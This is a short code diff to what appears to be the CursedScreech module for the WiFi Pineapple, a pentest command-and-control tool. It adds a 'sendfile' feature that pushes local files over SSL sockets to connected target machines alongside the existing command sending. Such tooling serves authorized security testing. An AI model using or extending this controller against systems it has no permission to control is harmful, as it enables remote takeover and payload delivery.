@@ -1,6 +1,7 @@
 from ssl import *
 from socket import *
 import time
+import os
 
 # Pull settings from file
 settingsFile = "/pineapple/modules/CursedScreech/includes/forest/settings"
@@ -67,9 +68,20 @@ class Target:
 
 	def send(self, data):
 		if self.isConnected():
-			self.socket.sendall(data.encode())
-			logReceivedData(data, self.addr)
-			logActivity("[!] Command sent to " + self.sockName())
+		
+			if "sendfile;" in data:
+				dataParts = data.split(";")
+				filePath = dataParts[1]
+				storeDir = dataParts[2]
+				self.socket.sendall("sendfile;" + os.path.basename(filePath) + ";" + str(os.path.getsize(filePath)) + ";" + storeDir)
+				with open(filePath, "rb") as f:
+					self.socket.sendall(f.read())
+					logActivity("[!] File sent to " + self.sockName())
+			else:
+				self.socket.sendall(data.encode())
+				logActivity("[!] Command sent to " + self.sockName())
+				logReceivedData(data, self.addr)
+			
 		
 	def recv(self):
 		try:
